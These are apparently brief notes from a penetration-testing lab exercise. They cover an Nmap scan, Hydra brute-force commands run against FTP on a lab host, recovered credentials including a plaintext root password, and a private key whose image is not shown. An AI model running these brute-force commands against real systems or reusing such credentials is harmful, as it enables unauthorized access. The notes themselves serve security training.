Found open FTP and SSH ports in Nmap scan

### Running Hydra on the root User
```shell-session
hydra -l root -P ../password.list ftp://10.129.95.150
```

Unsuccessful.

### Running Hydra
```shell-session
hydra -L ../username.list -P ../password.list ftp://10.129.95.150
```

### Found Credentials
mike:7777777

### Found SSH Private Key
![[Pasted image 20240412160752.png]]

passphrase we found before is required.

### Found root Password using the history Command
![[Pasted image 20240412161021.png]]

root:dgb6fzm0ynk@AME9pqu